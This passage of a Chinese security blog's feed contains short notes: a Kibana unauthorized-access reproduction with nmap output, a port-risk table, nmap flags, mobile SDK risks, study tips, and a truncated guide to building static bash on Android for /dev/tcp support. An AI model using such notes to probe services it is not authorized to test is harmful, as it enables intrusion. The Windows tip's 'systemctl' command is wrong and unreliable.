class="hljs-number">5601</span> <br>Starting Nmap <span class="hljs-number">7.95</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-12</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.182</span><span class="hljs-number">.8</span><span class="hljs-number">.138</span><br>Host is up (<span class="hljs-number">0.013</span>s latency).<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">5601</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Elasticsearch Kibana (serverName: kibana)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">11.51</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><h2 id="0x3-漏洞说明"><a href="#0x3-漏洞说明" class="headerlink" title="0x3 漏洞说明"></a><strong>0x3 漏洞说明</strong></h2><p>未授权访问导致的信息泄露或命令执行</p><p>威胁等级：高级</p><p>影响面：广泛</p><h2 id="0x4-漏洞复现"><a href="#0x4-漏洞复现" class="headerlink" title="0x4 漏洞复现"></a><strong>0x4 漏洞复现</strong></h2><p>常用URL：</p><p><a href="http://ip:port/v1/agent/self">http://ip:port/</a></p><p>实例：</p><p><a href="http://10.182.8.138:5601/app/kibana#/home">http://10.182.8.138:5601/app/kibana#/home</a></p><p><img src="/image-20241101154127295.png" alt="image-20241101154127295"></p><h2 id="0x5-漏洞修复"><a href="#0x5-漏洞修复" class="headerlink" title="0x5 漏洞修复"></a><strong>0x5 漏洞修复</strong></h2><p>配置nginx代理，增加密码验证</p><p>设置访问限制，只允许指定IP访问</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>elk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移动SDK安全风险</title>
    <link href="/2024/10/31/security/mobilesec/%E7%A7%BB%E5%8A%A8SDK%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E5%88%97%E8%A1%A8/"/>
    <url>/2024/10/31/security/mobilesec/%E7%A7%BB%E5%8A%A8SDK%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E5%88%97%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h2><h3 id="可能存在的安全风险："><a href="#可能存在的安全风险：" class="headerlink" title="可能存在的安全风险："></a>可能存在的安全风险：</h3><p>私钥或对称密钥硬编码</p><p>webView不规范使用</p><p>违规采集用户的个人隐私数据</p><p>绕过沙盒限制，访问应用私有组件</p><p>敏感数据明文传输</p><p>下载并安装恶意程序</p><p>不安全的证书校验</p><p>权限滥用</p><p><img src="/%E7%A7%BB%E5%8A%A8SDK%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E5%88%97%E8%A1%A8/SDK.png" alt="SDK"></p><p><a href="https://www.freebuf.com/articles/terminal/263869.html">https://www.freebuf.com/articles/terminal/263869.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移动安全框架</title>
    <link href="/2024/10/31/security/mobilesec/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6/"/>
    <url>/2024/10/31/security/mobilesec/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><img src="/image-20241104095821307.png" alt="image-20241104095821307"></p><p>【1】网易云首席安全架构师谈安全新形势：DDOS两三天，游戏玩家数从几万降到几百 技术干货 2018-06-07 </p><p><a href="https://dun.163.com/news/p/shouxijiagoushi">https://dun.163.com/news/p/shouxijiagoushi</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>port_control</title>
    <link href="/2024/10/31/security/secbuild/%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%92/"/>
    <url>/2024/10/31/security/secbuild/%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%92/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>安全规划指定步骤</p><p>一、调研</p><p>1、调研内容</p><p>这个领域最好的团队在做什么（最佳实践）</p><p>我们处在同行业什么水平（自我感知）</p><p>我们的现状（存在哪些差距）</p><p>2、调研方式</p><p>1）向互联网企业学习</p><p>参加互联网企业举行的年度会议，远离厂商自嗨会</p><p>2）向同业学习</p><p>二、确定规划目标、现状和差距</p><p>1、目标</p><p>总体目标：应该尽可能清晰、简洁，相对宏观和“务虚”</p><p>具体目标：应该尽可能明确、数字化，相对微观和“务实”</p><p><strong>目标Specific-明确性</strong></p><p><strong>要用具体的语言清楚地说明要达成的行为标准。</strong></p><p>举个例子，安全目标中有一条是“防黑反黑”。这种对目标的描述就很不明确，因为我们不知道要防护哪些目标，防护什么级别的黑暗力量。所以最后可以改成：能够承受除DDoS以外的黑客高手或者黑客集团的攻击；内部系统能有效防止非专业人员有意或者无意的数据泄露；能发现对内部重要服务器的普通内部黑客的攻击。</p><p><strong>目标Measurable-衡量性</strong></p><p><strong>目标应该有一组明确的数据，作为衡量是否达成目标的依据。如果目标没有办法衡量，就无法判断这个目标是否实现</strong></p><p>举个例子，定安全目标时，常见的用词是“提高××水平”“加强××能力”“完善××措施”，这些目标是无法衡量的，因为不知道要提高到什么水平，加强到什么能力，完善哪些措施。在内部定具体安全目标时尽量使用可量化的目标，例如，非我公司组织的互联网系统漏洞发现为0；管控措施失效能够在24小时内发现，等等。</p><p><strong>目标Attainable-可实现性</strong></p><p><strong>目标是能够被执行人所接受的，目标设置要坚持员工参与、上下左右沟通，使拟定的工作目标在组织及个人之间达成一致。</strong></p><p>举个例子，中小金融企业如果提出所有安全防护系统和工具都自研这一目标，虽然勇气可嘉，然而实现起来却非常困难。当目标完全不可实现，会打击团队士气，造成“死猪不怕开水烫”的后果。</p><p><strong>目标Relevant-相关性</strong></p><p><strong>实现此目标与其他目标的关联情况，需要与核心战略目标相关联</strong></p><p>举个例子，所有安全规划的目标和任务都是围绕保障企业安全性，并最终促进企业战略目标来计划的，如果一项工作与企业战略目标完全无关，不管其技术先进性多么强，都应该忽略。</p><p><strong>目标Time-bound-时限性</strong></p><p><strong>目标是有时间限制的，没有时间约束的目标是没有办法衡量和评价的</strong></p><p>举个例子，安全工作的目标和任务需要时间约束，比如三年后达到什么安全水平，每一年提升哪些安全能力，每个季度完成哪些安全任务，都是时间条件强约束。</p><p>2、现状和差距</p><p><strong>分析维度要全</strong></p><p>​安全管理</p><p>​组织架构</p><p>​职责</p><p>​制度</p><p>​考核</p><p>​安全防护（纵深防护技术体系）</p><p>​网络层</p><p>​虚拟层</p><p>​系统层</p><p>​应用层</p><p>​数据层</p><p>​用户层</p><p>​安全运营</p><p>​安全运维</p><p>​安全验证</p><p>​安全反制</p><p>​安全资源</p><p>​人员</p><p>​流程</p><p>​资源</p><p>​安全度量</p><p>​技术维度</p><p>​安全运营成效</p><p>​安全满意度</p><p>​安全价值</p><p><strong>敢于自揭老底</strong></p><p>三、制定解决方案</p><p>1、体系化</p><p>技术方面</p><p>管理方面</p><p>2、可持续</p><p>3、可接受</p><p>确保安全团队的每位成员都从心里认可和接受</p><p>四、优化解决方案，直到定稿</p><p>团队内充分讨论、碰撞，形成共识</p><p>IT内部其他团队征求意见</p><p>向上层回报定稿</p><p>五、向上层汇报</p><p>建立面向高级管理层、IT部门领导、安全团队内部的安全汇报体系</p><p>IT部门和安全团队进行常态化的安全汇报</p><p>六、回顾</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secbuild</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secbuild</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>port_control</title>
    <link href="/2024/10/31/security/secbuild/%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/port_control/"/>
    <url>/2024/10/31/security/secbuild/%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/port_control/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h2><p>限制对外开放端口</p><h2 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h2><p>Web服务对外默认开放80和443端口</p><p>点对点开放端口，五元组最小原则</p><h2 id="高危端口及服务"><a href="#高危端口及服务" class="headerlink" title="高危端口及服务"></a>高危端口及服务</h2><table><thead><tr><th>服务</th><th>端口号</th><th>端口协议</th><th>备注</th><th>安全风险</th></tr></thead><tbody><tr><td>Telnet</td><td>23</td><td>TCP</td><td></td><td></td></tr><tr><td>SSH</td><td>22</td><td>TCP</td><td></td><td></td></tr><tr><td>RDP</td><td>3389</td><td>TCP</td><td>Windows远程桌面</td><td></td></tr><tr><td>FTP</td><td>21</td><td>TCP</td><td>文件</td><td>FTP本地提权</td></tr><tr><td>MSSQL</td><td>1433</td><td>TCP</td><td>SQL Server数据库</td><td></td></tr><tr><td>MySQL</td><td>3306</td><td>TCP</td><td>MySQL数据库</td><td></td></tr><tr><td>Redis</td><td>6379</td><td>TCP</td><td>非关系型数据库</td><td>Redis未授权访问</td></tr><tr><td>Rsync</td><td>873</td><td>TCP</td><td>文件传输</td><td></td></tr><tr><td>memcached</td><td>11211</td><td>TCP</td><td>缓存数据库</td><td></td></tr><tr><td>Elasticsearch</td><td>9100</td><td>TCP</td><td></td><td>Elasticsearch勒索</td></tr><tr><td>Mongodb</td><td>27017</td><td>TCP</td><td>数据库</td><td>Mongodb勒索</td></tr><tr><td>Kibana</td><td>5601</td><td>TCP</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="安全扫描"><a href="#安全扫描" class="headerlink" title="安全扫描"></a>安全扫描</h2><h3 id="扫描策略"><a href="#扫描策略" class="headerlink" title="扫描策略"></a>扫描策略</h3><p>初步扫描是否开放 Masscan</p><p>针对性扫描开放端口信息  Nmap</p><h3 id="扫描注意事项"><a href="#扫描注意事项" class="headerlink" title="扫描注意事项"></a>扫描注意事项</h3><p>1、避开业务高峰</p><p>2、调整发包速率参数</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secbuild</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secbuild</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ddos_base</title>
    <link href="/2024/10/31/security/netSec/ddos/ddos_base/"/>
    <url>/2024/10/31/security/netSec/ddos/ddos_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nmap_base</title>
    <link href="/2024/10/31/security/sectools/nmap/nmap_base/"/>
    <url>/2024/10/31/security/sectools/nmap/nmap_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="常见扫描技术"><a href="#常见扫描技术" class="headerlink" title="常见扫描技术"></a>常见扫描技术</h2><p>半开放扫描（TCP SYN） -sS</p><p>全连接扫描（TCP Connect）  -sT</p><p>ACK扫描  -sA</p><p>FIN扫描 -sF</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows打开环境变量设置</title>
    <link href="/2024/10/30/yunwei/tips/Windows/Windows%E6%89%93%E5%BC%80%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/"/>
    <url>/2024/10/30/yunwei/tips/Windows/Windows%E6%89%93%E5%BC%80%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><strong>常见打开Windows环境变量设置页面的方式</strong></p><p><strong>1、快捷命令 sysdm.cpl</strong></p><p>按下Win+R 组合键，打开“运行”对话框</p><p>在对话框中输入 sysdm.cpl，确定打开系统属性页面</p><p>在系统属性页面选择“高级“页面中最下面的环境变量即可</p><p><strong>2、快捷命令 rundll32.exe sysdm.cpl,EditEnvironmentVariables</strong></p><p>按下Win+R 组合键，打开“运行”对话框</p><p>在对话框中输入rundll32.exe sysdm.cpl,EditEnvironmentVariables，确定即可</p><p><strong>3、搜索功能</strong></p><p>在Windows10或Windows11中的搜索功能（小圆圈）输入”环境变量“或“e nv”</p><p>在搜索结果中，点击 “编辑系统环境变量” 或类似的选项，即可打开环境变量设置窗口</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows查看系统启动时间</title>
    <link href="/2024/10/30/yunwei/tips/Windows/Windows%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%97%B6%E9%97%B4/"/>
    <url>/2024/10/30/yunwei/tips/Windows/Windows%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%97%B6%E9%97%B4/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>Q：如何查看系统启动时间</p><p>A：</p><p>按下Win+R 组合键，打开“运行”对话框</p><p>在对话框中输入 cmd，确定打开终端</p><p>在终端中输入 systemctl | find “系统启动时间” </p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习书籍</title>
    <link href="/2024/10/30/studytips/%E5%AD%A6%E4%B9%A0%E4%B9%A6%E7%B1%8D/"/>
    <url>/2024/10/30/studytips/%E5%AD%A6%E4%B9%A0%E4%B9%A6%E7%B1%8D/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="WEB前端逆向"><a href="#WEB前端逆向" class="headerlink" title="WEB前端逆向"></a>WEB前端逆向</h3><p>《Python 3网络爬虫开发实战(第二版)》作者:崔庆才</p><p>《反爬虫AST原理与还原混淆实战》作者:李岳阳</p><p>参考资源</p><p>【1】向二进制人员推荐两本WEB前端逆向书籍 沈沉舟 <a href="javascript:void(0);">青衣十三楼飞花堂</a> <em>2024年05月13日 21:41</em></p>]]></content>
    
    
    <categories>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>book</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习方法</title>
    <link href="/2024/10/30/studytips/%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"/>
    <url>/2024/10/30/studytips/%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="写作技巧"><a href="#写作技巧" class="headerlink" title="写作技巧"></a>写作技巧</h1><h2 id="文档编写方法"><a href="#文档编写方法" class="headerlink" title="文档编写方法"></a>文档编写方法</h2><h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p>必须记录文章名称、作者、时间、链接</p><p>例如：</p><p>【1】网络安全学习方法之一  沈沉舟 <em>2023年09月08日 19:53</em></p><p><a href="https://scz.617.cn/misc/202309071943.txt">https://scz.617.cn/misc/202309071943.txt</a></p><h1 id="学习技巧"><a href="#学习技巧" class="headerlink" title="学习技巧"></a>学习技巧</h1><h2 id="记录失败的尝试"><a href="#记录失败的尝试" class="headerlink" title="记录失败的尝试"></a>记录失败的尝试</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs">看一篇逆向工程文章，作者在某个关键环节用了春秋笔法，有意无意略了一些关键细<br>节。初看觉得说不通，按自己对OS的理解增加一些调试步骤，在此过程中踩了些坑。<br>后来搞得烦了，也是觉得能尝试的都尝试过了，可能就是无解，作者可能在忽悠，开<br>始放弃。逆向工程陷入思维定势后很容易精准踩坑而不自知，以至于怀疑自我、怀疑<br>人生。<br><br>我有个习惯，即便失败，也要记录失败前的「所有」尝试过程，即便下结论作者在忽<br>悠，也要写下我做了哪些实验才推断他在忽悠。写这些东西时，并不会因为是失败案<br>例，而随意写两笔，一样很严谨，严谨到所有约束条件、操作顺序均实践最后一次。<br>这算不上最后的挣扎，就是单纯地收尸、火化、装骨灰，我有洁癖，不喜天葬。虽然<br>非常之枯燥无味，但一定要做完这些，给画个句号，哪怕是不完美的句号。<br><br>许多人可能理解不了的是，这其中会有个微妙的差异出现。严谨记录带来新的有序，<br>在新的有序中，有更提纲挈领的视野，进而「可能」跳出旧的思维定势。许多人理解<br>不了这种微妙差异，更别说从实践中获益。<br><br>而我不是许多人，这次也不例外。收尸收了大概半个小时之后，突然，诈尸了，意外<br>看到符合理论预期的输出，惊喜。不知这是第多少次在放弃的最后时刻反转，在收尸<br>中诈尸，反正这个计数器又一次递增了。<br><br>这其实是一种行之有效的学习方法，不只是学习态度。虽然智商在下降，记忆在衰退，<br>但这种行为模式或许能坚持到最后。<br></code></pre></td></tr></table></figure><p>参考资源：</p><p>【1】网络安全学习方法之一  沈沉舟 <em>2023年09月08日 19:53</em></p><p><a href="https://scz.617.cn/misc/202309071943.txt">https://scz.617.cn/misc/202309071943.txt</a></p><h2 id="成体系学习某项技术，自己可以定一些框架，依此填补空白，迭代更新学习文档"><a href="#成体系学习某项技术，自己可以定一些框架，依此填补空白，迭代更新学习文档" class="headerlink" title="成体系学习某项技术，自己可以定一些框架，依此填补空白，迭代更新学习文档"></a>成体系学习某项技术，自己可以定一些框架，依此填补空白，迭代更新学习文档</h2><p>示例：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">☆ 安装mitmproxy<br>☆ mitmproxy基本操作<br>☆ mitmweb基本操作<br>☆ 客户端安装mitmproxy证书<br>    <span class="hljs-number">1</span>) Firefox安装mitmproxy证书<br>    <span class="hljs-number">2</span>) Chrome安装mitmproxy证书<br>    <span class="hljs-number">3</span>) Windows安装mitmproxy证书<br>    <span class="hljs-number">4</span>) curl使用mitmproxy证书<br>☆ mitmproxy与其他代理串联<br>    <span class="hljs-number">1</span>) <span class="hljs-keyword">Burp</span><br><span class="hljs-keyword"></span>    <span class="hljs-number">2</span>) Fiddler<br>    <span class="hljs-number">3</span>) Charles<br>☆ 代理类型转换<br>    <span class="hljs-number">1</span>) pproxy<br>    <span class="hljs-number">2</span>) pproxymain.exe<br>    <span class="hljs-number">3</span>) gost<br>    <span class="hljs-number">4</span>) glider<br>☆ 微信视频号下载<br>    <span class="hljs-number">1</span>) 启动Charles<br>    <span class="hljs-number">2</span>) 启动mitmweb<br>    <span class="hljs-number">3</span>) 客户端代理设置<br>    <span class="hljs-number">4</span>) Charles过滤规则<br>    <span class="hljs-number">5</span>) mitmproxy插件<br>☆ 参考资源<br></code></pre></td></tr></table></figure><p>写文档学习，初期先把问题在笔记里列出来，根据问题找答案，然后按自己的理解写答案。后期按知识体系列提纲</p><p>参考资源：</p><p>【1】HTTPS抓包扯淡  沈沉舟 <em>2023年09月01日 10:25</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://scz.<span class="hljs-number">617</span>.cn/network/<span class="hljs-number">202309010819</span>.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ghidra_base</title>
    <link href="/2024/10/30/security/mobilesec/mobilesectools/ghidra/ghidra_base/"/>
    <url>/2024/10/30/security/mobilesec/mobilesectools/ghidra/ghidra_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h1><h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a></p><h2 id="系统支持"><a href="#系统支持" class="headerlink" title="系统支持"></a>系统支持</h2><p>Windows</p><p>Linux</p><p>macOS</p><h2 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h2><p>需要java环境，建议使用java11或更高版本</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>Windows</p><p>解压下载的安装包后，Windows双击执行 ghidraRun.bat </p><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><p>打开主界面，选择file，选择New Project</p><p><img src="/image-20241030190700572.png" alt="image-20241030190700572"></p><p>Non-Shared Project：非共享项目</p><p>Shared Project ：共享项目</p><p>Next，选择项目目录和设置名称</p><h2 id="导入文件"><a href="#导入文件" class="headerlink" title="导入文件"></a>导入文件</h2><p>新建项目后，选择file，Import File</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>下载指定国家或区域的APP</title>
    <link href="/2024/10/30/yunwei/tips/Android/%E4%B8%8B%E8%BD%BD%E6%8C%87%E5%AE%9A%E5%9B%BD%E5%AE%B6%E6%88%96%E5%8C%BA%E5%9F%9F%E7%9A%84APP/"/>
    <url>/2024/10/30/yunwei/tips/Android/%E4%B8%8B%E8%BD%BD%E6%8C%87%E5%AE%9A%E5%9B%BD%E5%AE%B6%E6%88%96%E5%8C%BA%E5%9F%9F%E7%9A%84APP/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>夜神模拟器中使用Google play 下载海外 APP，提示“此商品无法在您所在国家&#x2F;区域购买或下载”</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>切换账号区域</p><p>1、用手机打开网址 <a href="https://myaccount.google.com/u/1/?pageId=none%E6%9F%A5%E7%9C%8B%E8%B0%B7%E6%AD%8C%E8%B4%A6%E5%8F%B7%E8%AE%BE%E7%BD%AE">https://myaccount.google.com/u/1/?pageId=none查看谷歌账号设置</a></p><p>2、选择“个人信息”</p><p>3、修改地址</p><p>之前是没有设置的，修改“家”的地址，可以通过地图拖拽选择地址</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见移动安全工具</title>
    <link href="/2024/10/30/security/mobilesec/mobilesectools/%E5%B8%B8%E8%A7%81%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/10/30/security/mobilesec/mobilesectools/%E5%B8%B8%E8%A7%81%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="风险自动化发现工具"><a href="#风险自动化发现工具" class="headerlink" title="风险自动化发现工具"></a>风险自动化发现工具</h2><p>drozer</p><p>Mobsf</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/10/29/security/mobilesec/mobilesectips/Untitled/"/>
    <url>/2024/10/29/security/mobilesec/mobilesectips/Untitled/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>exceltips</title>
    <link href="/2024/10/29/yunwei/applications/excel/exceltips/"/>
    <url>/2024/10/29/yunwei/applications/excel/exceltips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="自动适配列宽度"><a href="#自动适配列宽度" class="headerlink" title="自动适配列宽度"></a><strong>自动适配列宽度</strong></h2><h3 id="for-mac"><a href="#for-mac" class="headerlink" title="for mac"></a><strong>for mac</strong></h3><p><strong>使用功能区按钮</strong></p><p>1、选择需要调整的列</p><p>2、转到工具栏的“开始”选项卡</p><p>3、找到“格式”按钮并点击</p><p>4、在弹出的菜单中选择“自动调整列宽”</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>excel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移植bash到arm</title>
    <link href="/2024/10/29/security/mobilesec/%E7%A7%BB%E6%A4%8Dbash%E5%88%B0arm/"/>
    <url>/2024/10/29/security/mobilesec/%E7%A7%BB%E6%A4%8Dbash%E5%88%B0arm/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h5 id="Android中默认的shell是mksh，不支持-dev-tcp伪文件，所以需要编译静态bash到Android环境中使用"><a href="#Android中默认的shell是mksh，不支持-dev-tcp伪文件，所以需要编译静态bash到Android环境中使用" class="headerlink" title="Android中默认的shell是mksh，不支持&#x2F;dev&#x2F;tcp伪文件，所以需要编译静态bash到Android环境中使用"></a>Android中默认的shell是mksh，不支持&#x2F;dev&#x2F;tcp伪文件，所以需要编译静态bash到Android环境中使用</h5><h3 id="arm32-armeabi-v7a"><a href="#arm32-armeabi-v7a" class="headerlink" title="arm32(armeabi-v7a)"></a>arm32(armeabi-v7a)</h3><p>1、下载bash源码包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://ftp.gnu.org/gnu/bash/bash-<span class="hljs-number">5</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>2、配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure CC=/u</span>sr<span class="hljs-regexp">/bin/</span>arm-linux-gnueabihf-gcc --prefix=<span class="hljs-regexp">/opt/</span>bash --host=arm-linux --enable-static-link --without-bash-malloc<br><br>备注：<br>CC:指定编译器，需要安装arm交叉编译器<br>--profix:安装路径前缀，也就是make install 